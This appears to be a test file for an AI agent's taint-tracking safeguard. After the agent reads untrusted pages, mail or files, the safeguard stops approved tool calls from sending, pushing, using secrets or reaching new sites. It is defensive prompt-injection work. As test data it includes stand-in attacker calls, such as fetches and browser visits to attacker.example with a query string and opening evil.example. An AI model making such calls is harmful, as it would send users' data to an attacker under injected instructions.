import { describe, expect, it } from "vitest";

import { namedBy, Taint, taintBars, taintRaises, type TaintedCall } from "./taint.js";
import type { RiskAssessment } from "./tiers.js";
import { readFrom } from "./untrusted.js";

const risky: RiskAssessment = { tier: "risky", escalated: false };
const call = (tool: string, input: Record<string, unknown> = {}, extra: Partial<TaintedCall> = {}): TaintedCall => ({ tool, input, assessment: risky, secret: false, ...extra });
const page = (where: string) => new Taint([{ kind: "page", where }]);
const mail = new Taint([{ kind: "mail", where: "x@evil.example" }]);

describe("a turn's taint", () => {
  it("is clean until marked, keeps each source once, and stays tainted past the cap", () => {
    const taint = new Taint();
    expect(taint.tainted).toBe(false);
    for (let i = 0; i < 40; i += 1) taint.mark({ kind: "page", where: `h${i}.example` });
    taint.mark({ kind: "page", where: "h0.example" });
    expect(taint.tainted).toBe(true);
    expect(taint.sources).toHaveLength(12);
    expect(taint.sites()).toContain("h0.example");
  });

  it("bars nothing in a clean turn", () => {
    expect(taintBars(call("notify"), new Taint())).toBe(false);
    expect(taintRaises(call("cron.schedule"), new Taint())).toBe(false);
  });
});

describe("what a tainted turn's saved yes no longer covers", () => {
  it("sends, posts, the network, KOS itself, secrets and writes outside the folder", () => {
    expect(taintBars(call("notify"), mail)).toEqual({ why: "posts where others read" });
    expect(taintBars(call("discord.audience"), mail)).toEqual({ why: "changes who sees what on the server" });
    expect(taintBars(call("http.fetch", { url: "https://attacker.example/x" }), mail)).toEqual({ why: "reaches attacker.example" });
    expect(taintBars(call("mcp.gmail.send_message"), mail)).toEqual({ why: "sends through gmail" });
    expect(taintBars(call("mcp.git.git_push"), mail)).toEqual({ why: "changes something through git" });
    expect(taintBars(call("skills.commit"), mail)).toEqual({ why: "changes KOS itself" });
    expect(taintBars(call("secrets.allow_site"), mail)).toEqual({ why: "changes KOS itself" });
    expect(taintBars(call("computer.act"), mail)).toEqual({ why: "acts on your computer" });
    expect(taintBars(call("x.unknown"), mail)).toEqual({ why: "reaches outside the workspace" });
    expect(taintBars(call("files.write", {}, { assessment: { ...risky, reached: true } }), mail)).toEqual({ why: "writes outside this chat's folder" });
    expect(taintBars(call("http.fetch", {}, { secret: true }), mail)).toEqual({ why: "uses a secret" });
    expect(taintBars(call("sql", { sql: 'INSERT INTO "crons" (name) VALUES (1)' }), mail)).toEqual({ why: "changes KOS's own tables" });
  });

  it("lets Auto keep a program it holds offline, and nothing else", () => {
    expect(taintBars(call("shell.run", { command: "npm test" }), mail)).toEqual({ why: "runs a program that can reach the network", auto: true });
  });

  it("keeps covering what stays inside the workspace", () => {
    for (const tool of ["files.rm", "artifacts.write", "tasks.add", "memory.remember", "chats.handoff", "chats.delete"]) expect(taintBars(call(tool), mail)).toBe(false);
    expect(taintBars(call("sql", { sql: "UPDATE daily_items SET done = 1 WHERE id = 3" }), mail)).toBe(false);
  });

  it("keeps browsing and reading on from the one site the turn read, and nothing past it", () => {
    expect(taintBars(call("browser.act", { actions: [{ click: "@e1" }] }, { site: "www.shop.example" }), page("shop.example"))).toBe(false);
    expect(taintBars(call("browser.act", { actions: [{ click: "@e1" }] }, { site: "shop.example" }), mail)).toEqual({ why: "acts on a page after reading text from elsewhere" });
    expect(taintBars(call("browser.act", { actions: [{ open: "https://evil.example/" }] }, { site: "shop.example" }), page("shop.example"))).toEqual({ why: "opens evil.example" });
    expect(taintBars(call("http.fetch", { url: "https://api.example.com/page/2" }), page("api.example.com"))).toBe(false);
    expect(taintBars(call("http.fetch", { url: "https://api.example.com/page/2", method: "POST", body: "x" }), page("api.example.com"))).toEqual({ why: "reaches api.example.com" });
    expect(taintBars(call("http.fetch", { url: "https://api.example.com/page/2" }), new Taint([{ kind: "page", where: "api.example.com" }, { kind: "guest", where: "Sam" }]))).toEqual({ why: "reaches api.example.com" });
  });
});

describe("what a tainted turn asks for that would have run unasked", () => {
  it("a browser step to a site the turn has not been on, unless the owner named it", () => {
    const visit = call("browser.visit", { url: "https://attacker.example/c?d=1" });
    expect(taintRaises(visit, page("news.example"))).toBe("opens attacker.example, a site this turn had not been on");
    expect(taintRaises({ ...visit, said: "check the price on attacker.example too" }, page("news.example"))).toBe(false);
    expect(taintRaises(call("browser.visit", { url: "https://www.walmart.com/ip/1" }, { said: "compare amazon and walmart" }), page("amazon.com"))).toBe(false);
    expect(taintRaises(call("browser.visit", { url: "https://news.example/2" }), page("news.example"))).toBe(false);
  });

  it("work set up for later", () => {
    expect(taintRaises(call("cron.schedule"), mail)).toBe("schedules work that runs later without you");
    expect(taintRaises(call("blobs.create"), mail)).toBe("sets up a standing helper");
    expect(taintRaises(call("notify", { to: "owner" }), mail)).toBe(false);
  });

  it("names a site by its domain or its name as a word, never inside another", () => {
    expect(namedBy("go to walmart", "www.walmart.com")).toBe(true);
    expect(namedBy("go to notwalmart", "www.walmart.com")).toBe(false);
    expect(namedBy(undefined, "walmart.com")).toBe(false);
  });
});

describe("what a call read that the owner did not write", () => {
  it("pages, mail by its sender, documents and servers", () => {
    expect(readFrom("http.fetch", { url: "https://a.example/x" }, "")).toEqual({ kind: "page", where: "a.example" });
    expect(readFrom("browser.look", {}, "", { site: "b.example" })).toEqual({ kind: "page", where: "b.example" });
    expect(readFrom("mcp.google.get_gmail_message_content", {}, "From: Mallory <mallory@evil.example>\nhi")).toEqual({ kind: "mail", where: "mallory@evil.example" });
    expect(readFrom("mcp.google.get_doc_content", {}, "")).toEqual({ kind: "doc", where: "your Google Drive" });
    expect(readFrom("mcp.notes.search", {}, "")).toEqual({ kind: "server", where: "notes" });
  });

  it("files that came from outside, rows guests wrote, other chats, logs and programs", () => {
    expect(readFrom("files.read", { path: "projects/a/uploads/bill.pdf" }, "")).toEqual({ kind: "file", where: "bill.pdf" });
    expect(readFrom("files.read", { path: "notes/plan.md" }, "")).toBeUndefined();
    expect(readFrom("sql", { sql: "SELECT * FROM leetcode_daily_accounts" }, "", { guestTables: ["leetcode_daily_"] })).toEqual({ kind: "rows", where: "leetcode_daily_accounts" });
    expect(readFrom("sql", { sql: "SELECT * FROM school_items WHERE note = 'leetcode_daily_x'" }, "", { guestTables: ["leetcode_daily_"] })).toBeUndefined();
    expect(readFrom("chats.read", { id: "c1" }, "")).toEqual({ kind: "chat", where: "the chat c1" });
    expect(readFrom("kos.log", {}, "")).toEqual({ kind: "log" });
    expect(readFrom("daemons.logs", { id: 4 }, "")).toEqual({ kind: "program", where: "daemon 4" });
    expect(readFrom("skills.run", { name: "board" }, "")).toEqual({ kind: "program", where: "skill board" });
    expect(readFrom("memory.recall", {}, "")).toBeUndefined();
  });
});
